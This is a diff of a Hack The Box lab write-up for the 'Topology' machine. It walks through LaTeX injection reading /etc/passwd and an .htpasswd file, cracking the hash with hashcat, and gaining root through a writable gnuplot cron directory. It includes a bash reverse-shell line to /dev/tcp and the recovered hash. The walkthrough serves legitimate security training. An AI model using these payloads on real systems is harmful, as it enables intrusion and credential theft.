@@ -1,206 +1,156 @@
+---
+tags:
+  - box
+platform: HTB
+os: Linux
+difficulty:
+date_completed:
+mitre_attack: T1190, T1552.001, T1110.002, T1053.003
+status: rooted
+---
 
-**IP Address: 10.129.173.197**
+## Target
+
+**IP Address:** 10.129.173.197
 
 ## Recon
 
-#Nmap 
+#Nmap
 
 ```bash
 nmap -T4 -sV -sC -p- -oA targetScan 10.129.173.197
 ```
 
-###   Findings:
+#### Findings
 
-| Port  | Service  | Version             |
-| ----- | -------- | ------------------- |
-| 22    | SSH      | OpenSSH 8.2p1       |
-| 80    | HTTP     | Apache httpd 2.4.41 |
+| Port | Service | Version |
+|---|---|---|
+| 22 | SSH | OpenSSH 8.2p1 |
+| 80 | HTTP | Apache httpd 2.4.41 |
 
-Port 22 is open for ssh 
-Port 80 is open for http
-    Need to look at the website to see if anything is there
+Port 22 is open for SSH, port 80 is open for HTTP.
 
-![[Images/Topology/homePage.png]]
+![homePage](../../Images/Topology/homePage.png)
 
-The web page seems to be the website for a university of the topology group
-There are a few links on the web page but it seems that only one of them actually works and the rest take you back to the home page of the site
+The web page seems to be the website for a university topology group. There are a few links on the web page but only one of them actually works - the rest take you back to the homepage. The working link is `latex.topology.htb`.
 
-The link that works is:
-    latex.topology.htb
+I added this to my /etc/hosts file and got to the page.
 
-I added this to my /etc/hosts file and got to the page
-
-![[latexHomepage.png]]
+![latexHomepage](../../Images/Topology/latexHomepage.png)
 
 ## Enumeration
 
-###    Findings:
+The page says that it will allow you to put an equation into a box and then output a PNG that you can save.
 
-The page says that it is a page that will allow you to put an equation into the box and then output a png that you can save
+![latexEquation](../../Images/Topology/latexEquation.png)
 
-![[latexEquation.png]]
+When you add anything to the text box and hit generate, it makes a PNG of what you entered. Looking at the URL, it puts variables in the URL to generate the PNG: `eqn=` & `submit=`.
 
-When you add anything to the text box and hit generate it makes a png of what you entered
-    If you look at the URL it puts variables in the URL to generate the png
-        eqn= & submit=
+Looking into the LaTeX language, I found some built-in commands to try. The `\today` command output today's date; trying RCE-style commands gave an "illegal command" error.
 
-Looking into the LaTeX language I was able to find some commands that the LaTeX  language has built in to use
+![todayLatex](../../Images/Topology/todayLatex.png)
 
-Trying some commands that I found I was able to get different responses from the website
-    doing the backslash today command I was able to output today's date
-    trying other commands to do RCE I got an illegal command error
+![illegalCommand](../../Images/Topology/illegalCommand.png)
 
-![[todayLatex.png]]
+After researching LaTeX injection: https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection
 
-![[illegalCommand.png]]
+## Exploitation
 
-After doing some research on the LaTeX markup language, I was able to find some different injection methods that work in this text field
-    https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection
-
-I was able to find the the site is using a package called listings by reviewing the files in the base directory of latex.topology.htb and finding the header.tex file
-
-Using this listings package and the hack tricks page I was able to craft a usable injection for the page
+I found the site is using a package called `listings` by reviewing the files in the base directory of latex.topology.htb and finding the `header.tex` file. Using this listings package and the HackTricks page, I crafted a usable injection:
 
 ```latex
 $\lstinputlisting{/etc/passwd}$
 ```
 
-This command returned an image of the passwd file and let us know what users where on this machine
+This returned an image of the passwd file and revealed the users on the machine.
 
-![[Images/Topology/passwdFile.png]]
+![passwdFile](../../Images/Topology/passwdFile.png)
 
-Looking over the image I was able to find the one real user on the machine
-    vdaisley
+Found the one real user on the machine: `vdaisley`. Tried to find more useful files (config, passwd) at `/var/www/latex` and `/var/www`, but got nothing.
 
-After finding this I tried to find more files on the server that would be helpful, but I was not able to find anything to help me find any way onto the machine
+### Further Recon
 
-I was able to find the exact location that I am on the server at this page
-    /var/www/latex 
-I looked for the config file and the passwd file here and in just www but I did not get a response back
+Went back to do some virtual host fuzzing to look for more subdomains.
 
-## Recon
-
-###   Findings:
-
-At this point I have decided to go back to do some recon and see if there is anything else that I can find
-
-I decided to do some virtual host fuzzing to try and find some more subdomains since we know that there is one here already, there may be more to find that are just not advertised yet since the university has some software that are still in progress
-
-#Ffuf 
+#Ffuf
 
 ```bash
 sudo ffuf -v -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://topology.htb -H "Host: FUZZ.topology.htb" -fs 6767
 ```
 
-This returned two results
-    stats
-    dev
+Returned two results: `stats` and `dev`. Stats is a common default page; `dev` (giving a 401) looked more promising - navigating to it gives a login popup.
 
-![[ffufSubdomains.png]]
+![ffufSubdomains](../../Images/Topology/ffufSubdomains.png)
 
-Stats is a common page for sites to have and is something that is a default page, however, dev might have something for us even though it is giving a 401 error
+![devLogin](../../Images/Topology/devLogin.png)
 
-Navigating to the page is giving a login pop up
+### More Enumeration
 
-![[devLogin.png]]
+Rather than brute forcing the login, used the LFI to search for the password file and Apache config for this vhost. The default Apache config file name/location is `/etc/apache2/{apache2.conf|httpd.conf}`.
 
-## Enumeration
-
-###    Findings:
-
-We could try and brute force this, but now that we have another page directory I can search it for password files and config files with the injection technique
-
-In order to find the password file for this site I had to search for what the configuration file for Apache web pages/servers are
-    There are two different default file names depending on the version of Apache that is running
-        httpd.conf or apache2.conf 
-
-The default location of the server configuration is /etc/apache2/{filename}
-    in this case the file name is apache2.conf
-
-Using the LFI in the LaTeX equation generator I was able to read the file from the server
-
-```LaTeX
+```latex
 $\lstinputlisting{/etc/apache2/apache2.conf}$
 ```
 
-![[apacheConfigFile.png]]
+![apacheConfigFile](../../Images/Topology/apacheConfigFile.png)
 
-In this file there is a variable that is called "AccessFileName" and this is the variable that sets what file Apache will look for in each page's directory to look for to find more configuration information for that specific page
+Found the `AccessFileName` variable, which sets what file Apache looks for in each page directory for further config (i.e. `.htaccess`).
 
-Reading this file will give us more info on how the dev page is set up 
-    In this case we are wanting to find information on how the login page is working
-
-```LaTeX
+```latex
 $\lstinputlisting{/var/www/dev/.htaccess}$
 ```
 
-![[htaccessFile.png]]
+![htaccessFile](../../Images/Topology/htaccessFile.png)
 
-Reading this file gave me the variable "AuthUserFile" which tells the page where the user authentication file is inside of the page directory
-    The file is set to /var/www/dev/.htpasswd
-
-Now to read this file we should hopefully get a username and a hashed password that I can use to login to this page with
+This revealed `AuthUserFile`, telling us where the auth file lives: `/var/www/dev/.htpasswd`.
 
 ```latex
 $\lstinputlisting{/var/www/dev/.htpasswd}$
 ```
 
-This injection returned and image of a username and hashed password for vdaisley that I may be able to use to login to this dev page
-    vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
+This returned a username and hashed password for `vdaisley`:
 
-![[htppasdFile.png]]
+```
+vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
+```
 
-Using hash-identifier, I was able to find that this is an MD5(APR) hash and now I can try and crack this hash to get the password
+![htppasdFile](../../Images/Topology/htppasdFile.png)
 
-Using hashcat, I was able to get the clear text value of the password 
+Used hash-identifier to confirm it's an MD5(APR) hash, then cracked it with Hashcat:
 
 ```bash
 hashcat -a 0 hashes.hash /usr/share/wordlists/rockyou.txt
 ```
 
-![[crackedHash.png]]
+![crackedHash](../../Images/Topology/crackedHash.png)
 
-Using this username and password combo that I have found I was able to get logged in to the dev site
+Logged in to the dev site with the recovered credentials, then used the same creds over SSH.
 
-![[devHomepage.png]]
+![devHomepage](../../Images/Topology/devHomepage.png)
 
-Now that I know that these credentials work, I was able to use them to get logged in to the machine through ssh
+![sshLogin](../../Images/Topology/sshLogin.png)
 
-![[sshLogin.png]]
+User flag captured after SSH login as vdaisley:
 
-Now that I am logged in I am able to get the flag for this user 
+![userFlag](../../Images/Topology/userFlag.png)
 
-![[Images/Topology/userFlag.png]]
+## Privilege Escalation
 
-## Privilege Escalation 
-
-Now that I am on the machine I need to figure out what privileges I have and how to get to root.
-###   Findings:
-
-Running sudo -l told me that I am not allowed to run sudo on this machine
-
-Running linpeas did not find anything interesting that I had not already found
+`sudo -l` showed no sudo rights at all. LinPEAS didn't find anything new.
 
 #pspy
-
-Running pspy returned something interesting on the system
 
 ```bash
 ./pspy64
 ```
 
-![[pspyOutput.png]]
+![pspyOutput](../../Images/Topology/pspyOutput.png)
 
-This is saying that there is a job running that looks for all files with the extension "plt" in the folder /opt/gnuplot and then runs those files
+Found a job running that looks for all files with the extension `.plt` in `/opt/gnuplot` and runs them. Could `cd` into the folder but not `ls` it (no read), though it was writable.
 
-Going to the folder I was able to CD into it, but trying to LS it told me that I did not have the right privileges to do that but I can write into it
+Researched gnuplot and found it's a Linux command-line utility for 2D/3D graphs that uses `.plt` files. Found a technique for running system commands through it: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/
 
-After doing some research on what gnuplot is, I was able to find that it is a Linux command line utility that is used to create 2D and 3D graphs that uses plt files to run the things
-
-Doing some digging on how to use it to break it, I was able to find a site that had a way to run system commands through it
-    https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/
-
-This shows that by running system commands through it you can interact with the shell as whoever is running the script and since we know that root is running all of them every little bit we can write a script to get a root shell
+Since root runs everything dropped in that folder, wrote a `.plt` script to get a reverse shell as root:
 
 ```gnuplot
 system "whoami"
@@ -209,14 +159,21 @@ system "whoami"
 system "bash -c 'bash -i >& /dev/tcp/10.10.14.100/4444 0>&1'"
 ```
 
-I then place this script into the /opt/gnuplot directory and started a listener on my machine then waited for the system to run the script and give me my root shell
-
 ```bash
 cp revShell.plt /opt/gnuplot
-```
-```bash
 nc -lvnp 4444
 ```
 
-![[rootShell.png]]
+Root shell captured:
 
+![rootShell](../../Images/Topology/rootShell.png)
+
+## Flags
+
+**User:** captured via SSH login as vdaisley (see above)
+
+**Root/System:** captured via the gnuplot `.plt` cron abuse above
+
+## Lessons Learned
+
+LaTeX's `\lstinputlisting{}` (from the `listings` package) is effectively an arbitrary file read primitive if user input reaches a LaTeX compiler - chained here from `/etc/passwd` all the way to an `.htpasswd` file that gave real SSH credentials. On the privesc side: any world-writable directory that's periodically scanned/executed by a root cron job (gnuplot `.plt` files here) is a privesc path the moment you can write to it - `pspy` is the tool that surfaces these silently-running jobs when you have no visibility via `crontab -l`.
